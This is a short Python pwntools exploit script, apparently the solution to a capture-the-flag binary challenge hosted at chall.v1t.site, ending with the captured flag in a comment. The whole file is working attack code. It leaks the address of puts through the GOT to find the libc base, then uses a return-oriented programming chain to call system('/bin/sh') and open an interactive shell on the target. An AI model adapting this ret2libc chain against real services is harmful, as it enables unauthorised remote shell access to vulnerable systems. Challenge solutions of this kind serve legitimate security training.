from pwn import *
context.binary=exe=ELF('./chall',checksec=False)
libc=ELF('./libc.so.6',checksec=False)
p=process('./chall')
p=remote('chall.v1t.site', 30150)

pop_rdi=0x401214
main=0x40125b
payload=flat(
    p64(0x40101a),
    p64(pop_rdi),
    p64(exe.got['puts']),
    p64(exe.plt['puts']),
    p64(main),
    p64(0x40101a)*7,
)
sleep(1)
payload+=p64(int(p.recv().split()[-1],16))+p64(0x401259)
p.sendline(payload)
libc.address=u64(p.recvline().strip().ljust(8, b"\x00"))-libc.sym['puts']
log.info(f"libc: {hex(libc.address)}")


rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
binsh = next(libc.search(b"/bin/sh"))

payload = flat(
    p64(0x40101a),
    pop_rdi, 
    binsh,
    ret,
    libc.sym['system'],
    p64(0x40101a)*7,
)
sleep(1)
payload+=p64(int(p.recv().split()[-1],16))+p64(0x401259)
p.sendline(payload)
p.interactive()
#v1t{l34v3_r3t_rul3z_7h3_r0p_c7e9d46b43370b38f661b25166253d38}
